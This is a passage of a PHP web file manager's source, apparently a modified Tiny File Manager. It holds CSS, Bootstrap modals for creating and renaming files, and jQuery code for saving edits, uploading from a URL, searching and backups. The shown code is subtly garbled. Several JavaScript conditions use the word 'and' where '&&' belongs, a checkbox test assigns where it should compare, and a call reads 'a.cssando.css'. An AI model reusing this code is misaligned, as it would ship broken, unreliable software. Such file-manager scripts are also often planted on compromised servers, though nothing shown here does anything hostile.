48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?>">
<div id="wrapper" class="container-fluid">

    <?php
    }

    function fm_show_footer_login()
    {
    ?>
</div>
<?php print_external('js-jquery'); ?>
<?php print_external('js-bootstrap'); ?>
</body>
</html>
<?php
}


function fm_show_header()
{
$sprites_ver = '20160315';
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");

global $lang, $root_url, $sticky_navbar, $favicon_path;
$isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="gilour">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fanco($favicon_path).'" type="image/png">'; } ?>
    <title><?php echo fanco(APP_TITLE) ?></title>
    <?php print_external('pre-jsdelivr'); ?>
    <?php print_external('pre-cloudflare'); ?>
    <?php print_external('css-bootstrap'); ?>
    <?php print_external('css-font-awesome'); ?>
    <?php if (FM_USE_HIGHLIGHTJS and isset($_GET['view'])): ?>
    <?php print_external('css-highlightjs'); ?>
    <?php endif; ?>
    <script type="text/javascript">window.csrf = '<?php echo $_SESSION['token']; ?>';</script>
    <style>
        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
        *,*::before,*::after { box-sizing: border-box;}
        body { font-size:15px; color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
        #main-table .filename a { color:#222222; }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
        .hidden { display:none  }
        pre.with-hljs { padding:0; overflow: hidden;  }
        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form, .preview-img-container { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
        input#preview-img-zoomCheck[type=checkbox] { display:none }
        input#preview-img-zoomCheck[type=checkbox]:checked ~ label > img { max-width:none;max-height:none;cursor:zoom-out }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
        .compact-table tr:hover td { background-color:#fff  }
        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
        .break-word { word-wrap:break-word;margin-left:30px  }
        .break-word.float-left a { color:#7d7d7d  }
        .break-word + .float-right { padding-right:30px;position:relative  }
        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
        @media (max-width:481px) {
            #editor { top:150px; }
        }
        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
        .btn-2 { padding:4px 10px;font-size:small; }
        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
        li.folder:before { content:"\f114" }
        i.fa.fa-folder-o { color:#0157b3 }
        i.fa.fa-picture-o { color:#26b99a }
        i.fa.fa-file-archive-o { color:#da7d7d }
        .btn-2 i.fa.fa-file-archive-o { color:inherit }
        i.fa.fa-css3 { color:#f36fa0 }
        i.fa.fa-file-code-o { color:#007bff }
        i.fa.fa-code { color:#cc4b4c }
        i.fa.fa-file-text-o { color:#0096e6 }
        i.fa.fa-html5 { color:#d75e72 }
        i.fa.fa-file-excel-o { color:#09c55d }
        i.fa.fa-file-powerpoint-o { color:#f6712e }
        i.go-back { font-size:1.2em;color:#007bff; }
        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
        .dataTables_filter { display:none; }
        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
        .footer-action li { margin-bottom:10px; }
        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @keyframes fadein { from { bottom:0;opacity:0; }
        to { bottom:30px;opacity:1; }
        }
        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        @keyframes fadeout { from { bottom:30px;opacity:1; }
        to { bottom:0;opacity:0; }
        }
        #main-table span.badge { border-bottom:2px solid #f8f9fa }
        #main-table span.badge:nth-child(1) { border-color:#df4227 }
        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
        #main-table span.badge:nth-child(4) { border-color:#4581ff }
        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
        }
        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
        .lds-facebook { display:none;position:relative;width:64px;height:64px }
        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
        @keyframes lds-facebook { 0% { top:6px;height:51px }
        100%,50% { top:19px;height:26px }
        }
        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
        .c-preview-img { max-width: 300px; }
        .border-radius-0 { border-radius: 0; }
        .float-right { float: right; }
        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
        #main-table tr.even { background-color: #F8F9Fa; }
        .filename>a>i {margin-right: 3px;}
    </style>
    <?php
    if (FM_THEME == "dark"): ?>
        <style>
            :root {
                --bs-bg-opacity: 1;
                --bg-color: #f3daa6;
                --bs-dark-rgb: 28, 36, 41 !important;
                --bs-bg-opacity: 1;
            }
            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #CFD8DC; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #CFD8DC; }
            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
            .theme-dark input.form-control { background-color: #101518; color: #CFD8DC; }
            .theme-dark .dropzone { background: transparent; }
            .theme-dark .inline-actions > a > i { background: #79755e; }
            .theme-dark .text-white { color: #CFD8DC !important; }
            .theme-dark .table-bordered td, .table-bordered th { border-color: #343434; }
            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
            .message { background-color: #212529; }
            .compact-table tr:hover td { background-color: #3d3d3d; }
            #main-table tr.even { background-color: #21292f; }
            form.dropzone { border-color: #79755e; }
        </style>
    <?php endif; ?>
</head>
<body class="<?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?> <?php echo $isStickyNavBar; ?>">
<div id="wrapper" class="container-fluid">
    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php echo fm_get_theme(); ?>" method="post">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php echo lng('CreateNewItem') ?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php echo lng('ItemType') ?> </label></p>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                      <label class="form-check-label" for="customRadioInline1"><?php echo lng('File') ?></label>
                    </div>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                      <label class="form-check-label" for="customRadioInline2"><?php echo lng('Folder') ?></label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php echo lng('ItemName') ?> </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php echo lng('Enter here...') ?>" required>
                </div>
                <div class="modal-footer">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></button>
                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('CreateNow') ?></button>
                </div>
            </form>
        </div>
    </div>

    <!-- Advance Search Modal -->
    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php echo fm_get_theme(); ?>">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group mb-3">
                  <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?> <?php echo lng('a files') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                </div>
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2"><?php echo lng('Search file in folder and subfolders...') ?></p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!--Rename Modal -->
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php echo lng('Are you sure want to rename?') ?></h5>
            <p class="mb-1">
                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php echo lng('Enter new file name') ?>" required>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                <input type="hidden" name="rename_from" id="js-rename-from">
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php echo lng('Okay') ?></strong></button>
          </div>
        </form>
      </div>
    </div>

    <!-- Confirm Modal -->
    <script type="text/html" id="js-tpl-confirm">
        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
          <div class="modal-dialog" role="document">
            <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off" action="<%this.action%>">
              <div class="modal-body p-4 text-center">
                <h5 class="mb-2"><?php echo lng('Are you sure want to') ?> <%this.title%> ?</h5>
                <p class="mb-1"><%this.content%></p>
              </div>
              <div class="modal-footer flex-nowrap p-0">
                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php echo lng('Okay') ?></strong></button>
              </div>
            </form>
          </div>
        </div>
    </script>

    <?php
    }


    function fm_show_footer()
    {
    ?>
</div>
<?php print_external('js-jquery'); ?>
<?php print_external('js-bootstrap'); ?>
<?php print_external('js-jquery-datatables'); ?>
<?php if (FM_USE_HIGHLIGHTJS and isset($_GET['view'])): ?>
    <?php print_external('js-highlightjs'); ?>
    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
<?php endif; ?>
<script>
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") and t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) {
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState and 200 == n.status and toast(n.responseText)
        }, n.send(a), !1
    }
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    // Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (typeof n !== 'undefined' and n !== null) {
            if (true) {
                var data = {ajax: true, content: n, type: 'save', token: window.csrf};

                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: JSON.stringify(data),
                    contentType: "application/json; charset=utf-8",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
            } else {
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
            }
        }
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    // Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    // Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    // Search template
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    // Advance search
    function fm_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt and searchTxt.length > 2 and path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data and data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }

    // action confirm dailog modal
    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
        e.preventDefault();
        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
        let tpl = $("#js-tpl-confirm").html();
        $(".modal.confirmDailog").remove();
        $('#wrapper').append(template(tpl,tplObj));
        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
        $confirmDailog.modal('show');
        return false;
    }
    

    // on mouse hover image preview
    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.cssando.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);

    // Dom Ready Events
    $(document).ready( function () {
        // dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng and tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
        });
        // filter table
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { fm_search(); }
        });
        $('#search-addon3').on( 'click', function () { fm_search(); });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php if (isset($_GET['edit']) and isset($_GET['env']) and FM_EDIT_FILE and !FM_READONLY):
        
        $ext = pathinfo($_GET["edit"], PATHINFO_EXTENSION);
        $ext =  $ext == "js" ? "javascript" :  $ext;
        ?>
    <?php print_external('js-ace'); ?>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php echo $ext; ?>", inline:true} );
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        editor.setShowPrintMargin(false); // Hide the vertical ruler
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and 